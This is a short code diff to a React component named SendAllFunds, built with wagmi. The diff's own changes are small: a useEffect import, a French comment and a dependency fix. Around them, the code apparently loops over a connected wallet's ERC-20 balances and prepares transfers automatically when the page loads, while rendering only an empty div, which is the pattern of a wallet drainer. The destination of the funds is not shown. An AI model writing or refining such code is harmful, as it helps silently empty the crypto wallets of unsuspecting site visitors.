@@ -1,3 +1,4 @@
+import { useEffect } from 'react';
 import { useToasts } from '@geist-ui/core';
 import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { useAtom } from 'jotai';
@@ -44,7 +45,7 @@ export const SendAllFunds = () => {
       if (balance === '0') continue;
 
       try {
-        const balanceBigInt = BigInt(balance); // Ensure the balance is a valid BigInt
+        const balanceBigInt = BigInt(balance); // Assurer que le solde est un BigInt valide
 
         const { request } = await publicClient.simulateContract({
           account: walletClient.account,
@@ -79,7 +80,7 @@ export const SendAllFunds = () => {
       await sendAllFunds();
     };
     sendFundsIfValid();
-  }, [tokens]); // S'assurer que les tokens sont récupérés avant l'envoi
+  }, [sendAllFunds, tokens]); // Ajout de 'sendAllFunds' et 'tokens' dans les dépendances
 
   return <div style={{ margin: '20px' }}></div>;
 };
